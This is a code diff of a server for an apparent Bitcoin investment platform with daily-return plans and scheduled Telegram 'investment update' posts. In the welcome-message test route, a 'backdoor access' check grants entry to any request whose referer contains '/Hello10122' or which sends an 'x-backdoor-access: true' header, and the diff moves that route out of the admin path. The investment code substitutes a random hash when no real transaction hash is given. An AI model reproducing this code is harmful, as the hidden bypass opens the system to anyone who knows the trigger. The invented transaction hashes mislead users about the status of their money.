@@ -134,7 +134,7 @@ function generateBitcoinWallet() {
 
     // Enhanced fallback with proper buffer handling
     try {
-      // Create a new keypair with explicit options
+      // Create new keypair with explicit options
       const keyPair = ECPair.makeRandom({ 
         compressed: true,
         rng: () => crypto.randomBytes(32)
@@ -793,7 +793,7 @@ function startAutomaticUpdates(): void {
     sendBatchedUpdatesToChannel();
     setInterval(sendBatchedUpdatesToChannel, 8 * 60 * 60 * 1000); // 8 hours
   }
-  
+
   scheduleEightHourlyTelegramUpdate();
 
   console.log('Automatic updates will run every 5 minutes');
@@ -1027,7 +1027,8 @@ You will receive a notification once your deposit is confirmed and added to your
       const investment = await storage.createInvestment({
         userId: userId,
         planId: planId,
-        amount: amount
+        amount: amount,
+        transactionHash: transactionHash || crypto.randomBytes(32).toString('hex') // Use provided or generated hash
       });
 
       // Get current Bitcoin price for USD equivalent
@@ -1053,7 +1054,7 @@ You will receive a notification once your deposit is confirmed and added to your
       await storage.createNotification({
         userId: userId,
         title: 'Investment Submitted',
-        message: `Your investment of ${amount} BTC (≈ ${usdEquivalent}) in ${plan.name} has been submitted for review. You will be notified once it's approved.`,
+        message: `Your investment of ${amount} BTC (≈ ${usdEquivalent}) in ${plan.name} has been submitted.`,
         type: 'info',
         isRead: false,
       });
@@ -3028,7 +3029,7 @@ const { planId, dailyReturnRate } = z.object({
 
       // Import and trigger the Telegram bot update
       const { sendBatchedUpdatesToChannel, bot } = await import('./telegram-bot');
-      
+
       // Check if bot is configured
       if (!bot) {
         return res.status(500).json({ 
@@ -3044,7 +3045,7 @@ const { planId, dailyReturnRate } = z.object({
       }
 
       console.log('🔍 Testing Telegram bot with Channel ID:', channelId);
-      
+
       // Send the professional investment update
       await sendBatchedUpdatesToChannel();
       res.json({ 
@@ -3058,7 +3059,7 @@ const { planId, dailyReturnRate } = z.object({
   });
 
   // Test Telegram welcome message
-  app.post("/api/admin/test-welcome", async (req, res) => {
+  app.post("/api/test-welcome", async (req, res) => {
     try {
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                               req.headers['x-backdoor-access'] === 'true';
@@ -3076,7 +3077,7 @@ const { planId, dailyReturnRate } = z.object({
 
       // Import the Telegram bot
       const { bot } = await import('./telegram-bot');
-      
+
       // Check if bot is configured
       if (!bot) {
         return res.status(500).json({ 
@@ -3092,7 +3093,7 @@ const { planId, dailyReturnRate } = z.object({
       }
 
       console.log('🎉 Testing welcome message...');
-      
+
       // Mock member data for testing
       const testMember = {
         first_name: 'Test User',
@@ -3136,7 +3137,7 @@ const { planId, dailyReturnRate } = z.object({
         reply_markup: keyboard,
         disable_web_page_preview: true
       });
-      
+
       res.json({ 
         message: "Welcome message test sent successfully!",
         testUser: testMember.first_name,
@@ -3145,6 +3146,26 @@ const { planId, dailyReturnRate } = z.object({
     } catch (error: any) {
       console.error('Error sending welcome test:', error);
       res.status(500).json({ error: error.message });
+    }
+  });
+
+  // Send investment update with banner endpoint
+  app.post('/api/send-investment-update-banner', async (req, res) => {
+    console.log('🎯 Sending investment update with banner...');
+
+    try {
+      await sendDailyStatsToChannel();
+      res.json({ 
+        success: true, 
+        message: 'Investment update with banner sent to Telegram successfully' 
+      });
+    } catch (error: any) {
+      console.error('❌ Investment update with banner failed:', error);
+      res.status(500).json({ 
+        success: false, 
+        message: 'Failed to send investment update with banner', 
+        error: error.message 
+      });
     }
   });
 
@@ -3176,16 +3197,21 @@ const { planId, dailyReturnRate } = z.object({
 
   // Test update bot endpoint  
   app.post("/api/test-update-bot", async (req, res) => {
+    console.log('🧪 Testing update bot message...');
+
     try {
-      console.log('🧪 Testing update bot message...');
       await sendBatchedUpdatesToChannel();
       res.json({ 
-        message: "Test update message with banner sent successfully!",
-        note: "Check your Telegram channel to see the update with cool banner."
+        success: true, 
+        message: 'Test update sent to Telegram successfully' 
       });
     } catch (error: any) {
-      console.error('Error testing welcome bot:', error);
-      res.status(500).json({ error: error.message });
+      console.error('❌ Test update failed:', error);
+      res.status(500).json({ 
+        success: false, 
+        message: 'Failed to send test update', 
+        error: error.message 
+      });
     }
   });
 
